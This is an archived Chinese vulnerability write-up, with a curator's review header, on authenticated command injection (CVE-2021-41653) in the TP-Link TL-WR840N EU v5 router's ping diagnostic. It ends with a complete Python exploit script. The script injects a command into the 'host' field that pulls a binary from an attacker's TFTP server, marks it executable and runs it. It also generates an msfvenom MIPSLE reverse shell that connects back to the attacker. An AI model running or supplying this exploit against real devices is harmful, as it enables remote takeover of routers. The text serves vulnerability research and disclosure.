---
source: "MrWQ/vulnerability-paper"
id: "vw-9f8eac51328f574ad5567e9d"
entity_id: "ve-9f8eac51328f574ad5567e9d"
schema_version: "1"
title: "TP-Link TL-WR840N EU v5 远程代码执行"
product: "TP-Link TL-WR840N EU v5"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2021-41653"
referenced_identifiers: ""
prerequisites: "固件171211完整串；用户名密码、WAN连通、MIPSLE；UART仅调试"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/TP-Link/TP-Link%20TL-WR840N%20EU%20v5%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/1WCQ7rpJUmGWFZUigTZ_gA"
source_status: "recorded"
---

# TP-Link TL-WR840N EU v5 远程代码执行

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TP-Link TL-WR840N EU v5
- 本文讨论：CVE-2021-41653由原始URL指向；正文标题未编号
- 版本、权限与配置前提：固件171211完整串；用户名密码、WAN连通、MIPSLE；UART仅调试
- 资料类型：认证后命令注入研究与脚本；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- CVE未入元数据，源链接才体现；修复建议缺失
- URL和Referer内重复硬编码目标，配置顶层URL无效；工具称Meterpreter但脚本生成shell/reverse_tcp，监听负载需一致
- 多关键请求/输出在截图，不过完整脚本可补主要请求

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 原研究CVE、固定固件与WAN必要性待核验，未生成或执行载荷
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1WCQ7rpJUmGWFZUigTZ_gA)

型号： TP-Link TL-WR840N EU v5  
易受攻击的固件版本： TL-WR840N(EU)_V5_171211 / 0.9.1 3.16 v0001.0 Build 171211 Rel.58800n

![](../../.resource/remote/88fa2953330d508ff67a7625bdca7df80b2ac061f604be4527ca6cebc95912b6.png)

通过 UART 轻松 root
---------------

        使用 FT232 设备来获取对设备的 root 访问权限，这个控制台在漏洞利用开发过程中非常有用。

![](../../.resource/remote/579e60befd2c0e16bed6e67b87a96a409e28fbc7dc3d5f883885dc70ce09d215.png)

```
# check serial port
screen /dev/tty.usbserial-AB0LR7NH 115200
```

![](../../.resource/remote/bc046e560111f250536a91eac9481a9186224cdc364d0b58e3224caa71c3b089.png)

使用 UART 控制台仅用于调试

以下屏幕截图包含 GUI 上的相关输入参数，用户提供的输入参数不会在服务器端清理，它用于执行 PING 命令。

注意： WAN 线必须插好，路由器 IP 地址为 192.168.1.1。

![](../../.resource/remote/f68466aa8428d9431a9465ecc15032af190895ed12d5d04892f5a056bba43cc7.png)

供应商使用客户端 JavaScript 保护，但可以通过代理轻松绕过。

![](../../.resource/remote/739dbb09736f2890a79215815da8a290ee2ff4f2888dbc3a95b89cf0f3371309.png)

执行命令时，可以在串行控制台上看到确切的命令。

![](../../.resource/remote/9ed79795f2236f67f4adc45af517c48f4fb30dda0acbe982ec1bee4c0245aada.png)

我使用了 ghidra 和其他逆向工程工具来检查发生了什么，但是现在在服务器端没有清理参数就足够了。

要在路由器上执行代码，必须发送以下两个请求：

注意：还有其他请求，但它们不是实现代码执行所必需的。

![](../../.resource/remote/75e31073a7e85d359477e5e185a2e6005a593029435694417a11facde7df2f5c.png)

简单的代码执行
-------

下图包含 /var/tmp 文件夹的内容（通过 UART）该文件夹是可写的。

![](../../.resource/remote/40ff7a699f9c933f9a0236400002ae0c3458873624a22b1b02c38bd78e533964.png)

修改 host 参数创建文件：

![](../../.resource/remote/eb456b8ebbe9a132363278a58d19ea301031aadf5f85ac3d5dbd6da98a2e804c.png)

/var/tmp/k44 文件内容如下：

![](../../.resource/remote/15af0e8504c880cb5b874bb53303c43c91b64049173ba22e296e5a336d391f1d.png)

反壳
--

供应商提供的程序是有限的。成功的攻击需要多个步骤。TFTP 客户端可用于将文件从攻击者复制到路由器。

![](../../.resource/remote/c0ca63a2445099fccc7de77b93fe0e3c27ecd3a0f43fb3e2d7a116ccfd8c698f.png)

注意：用户名和密码是必需的。

1.  生成 meterpreter shell (IP, PORT)
    
2.  准备 TFTP 服务器
    
3.  复制 shell 到 TFTP 服务器
    
4.  打开 Meterpreter 侦听器
    
5.  向路由器发送请求
    
6.  通过 TFTP 下载 shell
    
7.  执行二进制文件并连接回攻击者
    

代码执行的重要部分执行以下操作：

1.  上传外壳
    
2.  更改 shell 的权限
    
3.  执行外壳
    

![](../../.resource/remote/ab086191cfae53117d1a9b7746a6d939ba5191ce8073ad10e48a6ad4795aa364.png)

POC + 演示
--------

笔记：

1.  使用 kali vm 和 msfvenom 工具来生成一个反向 shell 二进制文件。该架构是 MIPSLE。
    
2.  使用 atfpd 服务器作为 TFTP 服务器
    

使用多处理程序：

![](../../.resource/remote/b011a76a5fa5e0a9f364bf52b0381ad8dd669901f69a4e9b41b67d3e79c37cad.png)

执行脚本：

![](../../.resource/remote/fe49b69f234dd554fd3e8609ad2661c336bec3b123002136d51dec10105a40f2.png)

反壳：

![](../../.resource/remote/a757f555208a1f5af981f7d4d56bc101259b440fb63fec4c8847915fb1b4b37b.png)

POC

```
#!/usr/bin/python3
###############################################################
### tplink_TL-WR840N-EU-v5-rce-exploit_v1.py 
### Version: 1.0
### Author: Matek Kamillo (k4m1ll0)
### Email: matek.kamillo@gmail.com
### Date: 2021.09.06.
##############################################################

import requests
import os
import base64

USERNAME = "admin"
PASSWORD = "admin"
URL = "http://192.168.1.1/cgi"
PATH = "/srv/tftp/shell"
ATTACKER_IP = "192.168.1.101"
COMMAND = "$(echo 127.0.0.1; tftp -g -r shell -l /var/tmp/shell " + ATTACKER_IP + "; chmod +x /var/tmp/shell; /var/tmp/shell)"

def base64_encode(s):
    msg_bytes = s.encode('ascii')
    return base64.b64encode(msg_bytes)


class Exploit(object):
    def __init__(self, username, password, command):
        self.username = username
        self.password = password
        self.command = command

        self.URL = "http://192.168.1.1/cgi"
        self.session = requests.session()
        #self.proxies = { 'http' : 'http://192.168.1.100:8080'}
        self.proxies = { }
        self.cookies = { 'Authorization' : 'Basic ' + base64_encode(username + ":" + password).decode('ascii') }
        self.headers = { 'Content-Type': 'text/plain', 'Referer' : 'http://192.168.1.1/mainFrame.htm' }

    def _prepare(self):
        print("Generating reverse shell.")
        command = "msfvenom -p linux/mipsle/shell/reverse_tcp -f elf LHOST=" + ATTACKER_IP + " LPORT=2000 -o " + PATH
        os.system(command)

    def _send_ping_command(self):
        URL = self.URL + '?2'
        data = '[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n'
        data += 'dataBlockSize=64\r\n'
        data += 'timeout=1\r\n'
        data += 'numberOfRepetitions=4\r\n'
        data += 'host=' + self.command + '\r\n'
        data += 'X_TP_ConnName=ewan_ipoe_d\r\n'
        data += 'diagnosticsState=Requested\r\n'
        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)

    def _send_execute_command(self):
        URL = self.URL + '?7'
        data = '[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'
        r = self.session.post(URL, headers=self.headers, data=data, cookies=self.cookies, proxies=self.proxies)
        
    def execute(self):
        self._prepare()
        self._send_ping_command()
        self._send_execute_command()

if __name__ == "__main__":
    e = Exploit(USERNAME, PASSWORD, COMMAND)
    e.execute()
```

视频：

https://youtu.be/GBuuGdeTKgw

https://k4m1ll0.com/cve-2021-41653.html

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
